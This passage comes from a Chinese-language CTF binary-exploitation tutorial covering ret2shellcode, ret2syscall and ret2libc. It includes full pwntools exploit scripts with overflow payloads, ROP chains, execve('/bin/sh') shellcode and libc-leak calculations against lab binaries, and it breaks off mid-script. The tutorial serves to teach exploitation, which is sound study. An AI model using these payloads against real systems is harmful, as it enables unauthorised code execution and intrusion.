+<p>问题来了，shellcode怎么来？</p>
+<p>这里有个专门生成shellcode的公式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode = <span class="keyword">asm</span>(shellcraft.sh())</span><br></pre></td></tr></table></figure>
+
+<p>所以可以直接上exp了：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./ret2shellcode'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget(libc.6.so)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *'</span>+hex(addr))</span><br><span class="line">bss = <span class="number">0x804A080</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += shellcode.ljust(<span class="number">112</span>,<span class="string">'a'</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">ru(<span class="string">"No system for you this time !!!"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这种题基本上是灭绝了，因为堆栈基本是不可执行的，bss段也是，而且也是无脑shellcode直接getshell，所以只一题了解下，后期栈迁移会讲到迁移到本栈的shellcode执行的题目（需要泄露出栈地址才能操作~后面再讲）</p>
+<p>总结：会用shellcode生成公式，跳转到shellcode位置执行代码即可。</p>
+<p>这里提个醒，有时候自动生成的shellcode太长，需要自己去学着写shellcode，然后汇编转成代码，或者积累别人写的shellcode~以备不时之需。</p>
+<h3 id="3、ret2syscall"><a href="#3、ret2syscall" class="headerlink" title="3、ret2syscall"></a>3、ret2syscall</h3><p>这里要开始讲系统调用了：</p>
+<p>还是拿一道题看看</p>
+<p>链接：<a href="https://pan.baidu.com/s/1AtqcWfIYebb-6TaH27weqQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1AtqcWfIYebb-6TaH27weqQ</a><br>提取码：yuqt </p>
+<p><img src="/blog_img/1561976749311.png" alt="1561976749311"></p>
+<p>这里可知道是32位的然后只开了堆栈不可执行的保护，其他没开，第二步ida分析：</p>
+<p><img src="/blog_img/1561976807132.png" alt="1561976807132"></p>
+<p>逻辑很清晰，就只有一个栈溢出漏洞，然后有2个puts函数，一个gets函数，这里提示没有后门函数，没有shellcode可以写，该怎么办呢？这里只介绍syscall，其实可以2次调用先泄露出真实地址再栈溢出（就是ret2libc的内容了，这是埋下伏笔hhhhh）</p>
+<p>那么什么是syscall呢？ret2syscall，即控制程序执行系统调用，获取 shell。 系统调用是专门的函数：</p>
+<p>execve(“/bin/sh”，null，null)，其中，“/bin/sh”是execve()系统调用函数要执行的命令，还有像“ls”等这些命令，这个系统调用可以理解成system(“/bin/sh”)，该程序是 32 位，所以我们需要使得</p>
+<ul>
+<li><p>系统调用号，即 eax 应该为 0xb</p>
+</li>
+<li><p>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</p>
+</li>
+<li><p>第二个参数，即 ecx 应该为 0</p>
+</li>
+<li><p>第三个参数，即 edx 应该为 0</p>
+<h4 id="32位的汇编getshell代码如下："><a href="#32位的汇编getshell代码如下：" class="headerlink" title="32位的汇编getshell代码如下："></a>32位的汇编getshell代码如下：</h4></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch = <span class="string">'i386'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(shellcraft.execve(<span class="string">'/bin/sh'</span>))</span><br><span class="line">    /* execve(path=<span class="string">'/bin/sh'</span>, argv=<span class="number">0</span>, envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">'/bin/sh\x00'</span> */</span><br><span class="line">    push <span class="number">0x1010101</span></span><br><span class="line">    xor dword ptr [esp], <span class="number">0x169722e</span></span><br><span class="line">    push <span class="number">0x6e69622f</span></span><br><span class="line">    mov ebx, esp</span><br><span class="line">    xor ecx, ecx</span><br><span class="line">    xor edx, edx</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0xb</span> */</span><br><span class="line">    pop eax</span><br><span class="line">    int <span class="number">0x80</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="eax-0xb-ebx-addr-“-bin-sh”-ecx-0-edx-0"><a href="#eax-0xb-ebx-addr-“-bin-sh”-ecx-0-edx-0" class="headerlink" title="eax = 0xb ebx = addr(“/bin/sh”) ecx = 0 edx = 0"></a>eax = 0xb ebx = addr(“/bin/sh”) ecx = 0 edx = 0</h4><p>那么64位的是怎么样的呢：</p>
+<h4 id="64位的汇编getshell代码如下："><a href="#64位的汇编getshell代码如下：" class="headerlink" title="64位的汇编getshell代码如下："></a>64位的汇编getshell代码如下：</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>context.arch = <span class="string">'amd64'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(shellcraft.execve(<span class="string">'/bin/sh'</span>))</span><br><span class="line">    /* execve(path=<span class="string">'/bin/sh'</span>, argv=<span class="number">0</span>, envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">'/bin/sh\x00'</span> */</span><br><span class="line">    mov rax, <span class="number">0x101010101010101</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rax, <span class="number">0x101010101010101</span> ^ <span class="number">0x68732f6e69622f</span></span><br><span class="line">    xor [rsp], rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
+
+<h4 id="rax-0x3b-rdi-addr-“-bin-sh”-rdx-0-rsi-0"><a href="#rax-0x3b-rdi-addr-“-bin-sh”-rdx-0-rsi-0" class="headerlink" title="rax = 0x3b rdi = addr(“/bin/sh”) rdx = 0 rsi = 0"></a>rax = 0x3b rdi = addr(“/bin/sh”) rdx = 0 rsi = 0</h4><p>以后会用到onegadget其实就是封装好的可以直接调用的系统调用，onegadget是要满足一些栈的条件的，后续再讲~</p>
+<h4 id="系统调用认准这两个就问题不大了"><a href="#系统调用认准这两个就问题不大了" class="headerlink" title="系统调用认准这两个就问题不大了~"></a>系统调用认准这两个就问题不大了~</h4><p>所以我们需要找4个rop链子，pop_eax_ret,pop_ebx_ret,pop_ecx_ret,pop_edx_ret,然后挨个塞入参数构造payload，这里直接用ROPgadget那个万能公式：</p>
+<p><img src="/blog_img/1561978108960.png" alt="1561978108960"></p>
+<p>成功找到想要的链子（但是有时没有那么好运，正好有想要的，只能间接性地去拿，嗯，间接，你应该想到了）</p>
+<p>那就可以构造payload了：</p>
+<p>找到int_0x80的系统调用（execve函数）</p>
+<p><img src="/blog_img/1561978404377.png" alt="1561978404377"></p>
+<p>接着还需要找到/bin/sh的地址才行，string找一波：</p>
+<p><img src="/blog_img/1561997629369.png" alt="1561997629369"></p>
+<p>那么直接上exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./ret2syscall'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./ret2syscall'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget(libc.6.so)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_ecx_ebx_ret = <span class="number">0x0806eb91</span></span><br><span class="line">pop_edx_ret = <span class="number">0x0806eb6a</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80BE408</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">112</span></span><br><span class="line">payload += p32(pop_eax_ret)</span><br><span class="line">payload += p32(<span class="number">0xb</span>)</span><br><span class="line">payload += p32(pop_ecx_ebx_ret)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += p32(pop_edx_ret)</span><br><span class="line">payload += p32(<span class="number">0x0</span>)</span><br><span class="line">payload += p32(int_0x80)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>这里如果没有/bin    /sh的话可以自己构造写入到bss段的起始位置，具体就是二重调用了，然后获得bss起始地址作为binsh的地址，接着操作步骤就是一样的。</p>
+<p>总结：32位的程序，先找下ROP链看看有没有int_0x80的execve的系统内核中断调用，64位的看看有没有syscall的系统调用，如果都没有，可以放弃该方法，有则直接用。</p>
+<h3 id="4、ret2libc"><a href="#4、ret2libc" class="headerlink" title="4、ret2libc"></a>4、ret2libc</h3><p>这里直接讲我们的libc库，涉及到动态链接和延迟绑定的问题，还可以涉及到高级栈溢出的操作，但是这里只讲最简单的操作，这里需要先了解下动态链接和延迟绑定是什么东西以及工作机制，讲动态链接，讲到静态链接，静态链接就是函数真实地址在编译时已经实现了got表绑定，一切都准备好了，而动态链接，动态体现在函数真实地址存放于libc库中，只有在运行时才会和库链接起来，进行地址绑定，而且只有执行过一次函数，该函数的真实地址才会被写入到程序文件中，这里面的工作机制如下图：</p>
+<p> <img src="/blog_img/lazy-plt.png" alt=""></p>
+<p>当函数第一次被调用时，got表里面是没有它的真实地址的，存的是push n的地址，然后经过plt函数的一系列操作，会执行dl_runtime_resolve函数，实现真实地址写入got表。所以只有该函数执行过了一次，它的got表里面才有真实地址，got才有现实意义。如果想详细了解过程，可以参考《程序员的自我修养》一书，动态链接那里。</p>
+<h4 id="然后记住一条判断程序时静态链接还是动态链接的公式：ldd-文件名"><a href="#然后记住一条判断程序时静态链接还是动态链接的公式：ldd-文件名" class="headerlink" title="然后记住一条判断程序时静态链接还是动态链接的公式：ldd  文件名"></a>然后记住一条判断程序时静态链接还是动态链接的公式：ldd  文件名</h4><p>ret2libc就是针对真实地址进行的操作：</p>
+<p>因为libc库中存有各种函数的偏移地址，举例：0x3fea1（system函数的libc偏移）</p>
+<p>而有个基地址：0x7fxxxxx0000（64位）、0xf7xxx0000（32位）</p>
+<p>这里我们只要知道基地址，就可以去libc库中找偏移地址，因为：</p>
+<h4 id="真实地址-基地址-偏移地址"><a href="#真实地址-基地址-偏移地址" class="headerlink" title="真实地址 = 基地址 + 偏移地址"></a>真实地址 = 基地址 + 偏移地址</h4><p>如果我们泄露了函数的真实地址，就可以根据：</p>
+<h4 id="基地址-真实地址-偏移地址"><a href="#基地址-真实地址-偏移地址" class="headerlink" title="基地址 = 真实地址 - 偏移地址"></a>基地址 = 真实地址 - 偏移地址</h4><p>得到基地址，有了基地址，加上任意函数的libc偏移，就可以知道任意函数的真实地址（我们当然最爱system函数啦）</p>
+<p>有了真实地址，ret地址一填，那么即可getshell~</p>
+<p>纸上谈兵不如实操一波：</p>
+<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>链接：<a href="https://pan.baidu.com/s/18TeImNT4acHLcfHkwtlafQ" target="_blank" rel="noopener">https://pan.baidu.com/s/18TeImNT4acHLcfHkwtlafQ</a><br>提取码：nnwy </p>
+<p><img src="/blog_img/1562139263439.png" alt="1562139263439"></p>
+<p>只有堆栈不可执行的保护，64位的程序，ida分析一波：</p>
+<p><img src="/blog_img/1562139232737.png" alt="1562139232737"></p>
+<p>只有一个栈溢出gets函数，没有shellcode，没有系统调用，也没有后门函数，无计可施？？</p>
+<p>现在就是解锁新姿势的时候：泄露出一个真实地址，间接计算出system函数和binsh的地址，实现getshell</p>
+<p>看到有puts函数，可以利用，而且执行后有真实地址，就是你了，思路：</p>
+<p>1、先利用栈溢出调用puts函数打印出自己的got表真实地址，接收，再跳回pwnme执行一次</p>
+<p>2、计算system和binsh的地址</p>
+<p>3、第二次输入直接ret到system函数去getshell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./ret2libc'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./ret2libc'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget(libc.6.so)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">pwnme_addr = <span class="number">0x4005DA</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400673</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>] </span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">"gets"</span>]</span><br><span class="line">puts_libc = libc.symbols[<span class="string">"puts"</span>]</span><br><span class="line">system_libc = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binsh_libc = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += <span class="string">'aaaaaaaa'</span></span><br><span class="line">payload += p64(pop_rdi_ret)//调用puts函数打印got真实地址</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(pwnme_addr)     //再调用一次</span><br><span class="line">ru(<span class="string">"I am sure that you are not cxk"</span>)</span><br><span class="line"><span class="comment">#bk(0x4005FD)</span></span><br><span class="line">sl(payload)</span><br><span class="line">rc(<span class="number">1</span>)       //先接收\x0a，题目自身原因，一般不用~</span><br><span class="line">puts_addr = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))    //一波计算</span><br><span class="line"><span class="keyword">print</span> <span class="string">"puts_addr---&gt;"</span> + hex(puts_addr)</span><br><span class="line">offset = puts_addr - puts_libc</span><br><span class="line">binsh_addr = offset + binsh_libc</span><br><span class="line">system_addr = offset + system_libc</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span>             //第二次输入直接ret到system函数</span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += <span class="string">'aaaaaaaa'</span></span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">ru(<span class="string">"I am sure that you are not cxk"</span>)</span><br><span class="line">sl(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>为了加深印象，再来一题：pwn9</p>
+<p>链接：<a href="https://pan.baidu.com/s/1KTsilzXZyhjc9B4gpfOnJQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1KTsilzXZyhjc9B4gpfOnJQ</a><br>提取码：p8k6 </p>
+<p><img src="/blog_img/1562141362701.png" alt="1562141362701"></p>
+<p>没有保护，然后是32位的，决定利用泄露真实地址的方法：</p>
+<p><img src="/blog_img/1562141285462.png" alt="1562141285462"></p>
+<p>只有一个fgets函数，栈溢出，然后思路是一模一样的，注意32的参数位置即可：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn9'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn9'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget(libc.6.so)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#shellcode="\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"><span class="comment">#addr = u64(rc(6).ljust(8,'\x00'))</span></span><br><span class="line"><span class="comment">#addr = u32(rc(4))</span></span><br><span class="line"><span class="comment">#addr = int(rc(6),16)#string</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">	gdb.attach(p,<span class="string">'b *'</span>+hex(addr))</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">"puts"</span>]</span><br><span class="line">puts_plt = elf.symbols[<span class="string">"puts"</span>]</span><br><span class="line">pwn = <span class="number">0x80484BB</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'a'</span>*<span class="number">0x20</span></span><br><span class="line">payload += <span 